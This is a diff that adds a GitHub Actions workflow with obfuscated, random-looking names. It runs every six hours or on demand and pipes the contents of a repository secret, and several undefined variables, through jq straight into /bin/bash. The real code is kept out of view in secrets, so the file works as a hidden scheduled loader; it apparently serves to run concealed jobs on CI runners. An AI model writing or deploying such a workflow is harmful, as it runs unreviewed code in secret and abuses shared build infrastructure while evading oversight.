@@ -1,0 +1,26 @@
+name: sunmengsha7653
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '59 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: sunmengsha7653
+        env:
+          q68781: ${{ secrets.q68781 }}
+        run: |
+          echo $q68781 | jq -r .xfl8356 | /bin/bash
+          echo $c778 | jq -r .x92232 | /bin/bash
+          echo $qyk30015 | jq -r .bpsss99804 | /bin/bash
+          echo $id7374 | jq -r .ohm5 | /bin/bash
+          echo $qqqs4874 | jq -r .lhb2159 | /bin/bash
+          echo $p8 | jq -r .s275 | /bin/bash
+          echo $rv60 | jq -r .hjafl2 | /bin/bash
+          echo $ahn32805 | jq -r .pes5 | /bin/bash
+          echo $ditl66 | jq -r .fby2 | /bin/bash
+
